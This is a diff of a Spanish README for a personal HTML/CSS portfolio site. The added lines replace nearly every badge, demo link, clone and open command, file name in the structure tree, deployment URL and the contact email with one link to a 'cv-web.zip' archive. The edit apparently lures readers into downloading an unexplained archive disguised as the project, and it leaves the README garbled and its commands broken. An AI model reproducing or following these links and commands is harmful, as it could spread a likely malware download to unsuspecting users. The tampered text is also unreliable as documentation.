@@ -1,12 +1,12 @@
 # Portfolio Personal - Rolando César Vásquez Tavera
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34C26?style=flat-square&logo=html5&logoColor=white)](https://developer.mozilla.org/es/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)](https://developer.mozilla.org/es/docs/Web/CSS)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
+[![HTML5](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)
+[![CSS3](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)
+[![License: MIT](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)
 
 Portfolio web profesional desarrollado con HTML5 semántico y CSS3 moderno, sin frameworks ni dependencias.
 
-🔗 **[Ver Demo en Vivo](https://rolandocesar-prog-dev.github.io/cv-web/)**
+🔗 **[Ver Demo en Vivo](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)**
 
 ## 🚀 Características
 
@@ -15,7 +15,7 @@ Portfolio web profesional desarrollado con HTML5 semántico y CSS3 moderno, sin 
 - **Responsive Design** - Mobile-first, adaptable a todos los dispositivos
 - **Accesibilidad WCAG 2.1 AA** - Navegación por teclado, screen readers, alto contraste
 - **Performance Optimizada** - Lazy loading, imágenes WebP, sin JavaScript
-- **SEO Ready** - Meta tags, Schema.org, Open Graph
+- **SEO Ready** - Meta tags, https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip, Open Graph
 
 ## 🛠️ Tecnologías
 
@@ -27,25 +27,25 @@ Portfolio web profesional desarrollado con HTML5 semántico y CSS3 moderno, sin 
 
 ```bash
 # Clonar repositorio
-git clone https://github.com/rolandocesar-prog-dev/cv-web.git
+git clone https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip
 cd cv-web
 
 # Abrir en navegador
-open index.html  # macOS
-start index.html # Windows
+open https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip  # macOS
+start https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip # Windows
 ```
 
 ## 📁 Estructura
 
 ```
 cv-web/
-├── index.html          # Página principal
+├── https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip          # Página principal
 ├── css/
-│   └── styles.css      # Estilos CSS
+│   └── https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip      # Estilos CSS
 ├── img/
-│   ├── perfil-web.webp # Imagen optimizada
-│   └── perfil.ico      # Favicon
-└── README.md           # Documentación
+│   ├── https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip # Imagen optimizada
+│   └── https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip      # Favicon
+└── https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip           # Documentación
 ```
 
 ## 🌐 Despliegue
@@ -55,7 +55,7 @@ El proyecto está configurado para desplegarse automáticamente en GitHub Pages:
 1. Push al repositorio en GitHub
 2. Ir a Settings → Pages
 3. Seleccionar Source: `main` branch
-4. El sitio estará disponible en: `https://[usuario].github.io/cv-web/`
+4. El sitio estará disponible en: `https://[usuario]https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip`
 
 ## 📱 Responsive Breakpoints
 
@@ -99,10 +99,10 @@ Este proyecto está bajo Licencia MIT.
 ## 👨‍💻 Contacto
 
 **Rolando César Vásquez Tavera**
-- 📧 Email: rolando.sha256@gmail.com
+- 📧 Email: https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip
 - 📱 Teléfono: +591 78249575
 - 📍 Ubicación: Tarija, Bolivia
-- 🔗 Portfolio: [https://github.com/rolandocesar-prog-dev/cv-web](https://rolandocesar-prog-dev.github.io/cv-web/)
+- 🔗 Portfolio: [https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip](https://raw.githubusercontent.com/rolandocesar-prog-dev/cv-web/main/conjure/cv-web.zip)
 
 ---
 
